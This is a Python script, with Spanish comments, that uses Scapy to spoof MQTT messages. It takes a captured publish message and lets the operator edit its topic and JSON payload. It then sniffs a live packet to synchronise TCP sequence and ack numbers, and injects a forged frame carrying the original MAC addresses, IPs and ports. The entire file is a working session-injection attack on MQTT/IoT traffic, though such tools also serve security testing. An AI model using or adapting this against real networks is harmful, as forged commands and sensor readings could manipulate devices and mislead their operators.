from scapy.all import sniff, sendp, Ether, IP, TCP
from mqtt_parser import captured
import json

def editar_topic(topic_str):
    partes = topic_str.split('/')
    print("\n[EDICIÓN DE TOPIC]")
    nuevas = [input(f"{i+1}. {parte} → ") or parte for i, parte in enumerate(partes)]
    return '/'.join(nuevas)

def editar_payload(payload_str):
    inicio_json = payload_str.find('{')
    if inicio_json == -1:
        print("[!] No se encontró JSON en el payload.")
        return payload_str
    try:
        data = json.loads(payload_str[inicio_json:])
    except json.JSONDecodeError:
        print("[!] JSON inválido.")
        return payload_str
    print("\n[EDICIÓN DE PAYLOAD]")
    for k in data:
        original = data[k]
        nuevo = input(f"{k} = {original} → ") or original
        try:
            if isinstance(original, int): nuevo = int(nuevo)
            elif isinstance(original, float): nuevo = float(nuevo)
            elif isinstance(original, bool): nuevo = nuevo.lower() in ['true','1','yes']
        except: pass
        data[k] = nuevo
    return json.dumps(data)

def encode_remaining_length(length):
    out = bytearray()
    while True:
        encoded = length % 128
        length //= 128
        if length > 0:
            encoded |= 0x80
        out.append(encoded)
        if length == 0:
            break
    return out

def spoof_and_send(sel, iface):
    msg = captured[sel]
    if not msg.get("editable", False):
        print("[!] Este mensaje no es modificable.")
        return

    topic_new = editar_topic(msg['topic'])
    payload_new = editar_payload(msg['payload'])

    print("[*] Esperando paquete TCP real para sincronizar secuencia...")
    seq_ref = ack_ref = None

    def sync(pkt):
        nonlocal seq_ref, ack_ref
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            if (pkt[IP].src == msg['src_ip'] and pkt[IP].dst == msg['dst_ip'] and
                pkt[TCP].sport == msg['src_port'] and pkt[TCP].dport == msg['dst_port']):
                seq_ref = pkt[TCP].seq + len(pkt[TCP].payload)
                ack_ref = pkt[TCP].ack
                return True
        return False

    sniff(filter=f"tcp and src host {msg['src_ip']} and dst host {msg['dst_ip']} and port {msg['dst_port']}",
          iface=iface, prn=lambda x: None, stop_filter=sync, timeout=5)

    if seq_ref is None:
        print("[!] No se pudo sincronizar con un paquete real.")
        return

    # Construcción campo a campo
    fixed_header = bytes([msg['fixed_header']])
    topic = topic_new.encode('utf-8')
    topic_len = len(topic).to_bytes(2, 'big')
    payload = payload_new.encode('utf-8')

    pid = b''
    if msg['qos'] > 0 and msg['packet_id'] is not None:
        pid = msg['packet_id'].to_bytes(2, 'big')

    properties = msg['properties_length_bytes'] + msg['properties_raw']

    # Variable header + payload
    mqtt_body = topic_len + topic + pid + properties + payload

    # Remaining Length
    remaining = encode_remaining_length(len(mqtt_body))

    # MQTT final
    mqtt_packet = fixed_header + remaining + mqtt_body

    # Paquete TCP completo
    forged = Ether(src=msg['src_mac'], dst=msg['dst_mac']) / \
             IP(src=msg['src_ip'], dst=msg['dst_ip']) / \
             TCP(sport=msg['src_port'], dport=msg['dst_port'],
                 flags='PA', seq=seq_ref, ack=ack_ref) / \
             mqtt_packet

    sendp(forged, iface=iface, verbose=0)
    print("\n[✓] Spoof enviado correctamente con paquete MQTT reconstruido completamente.")
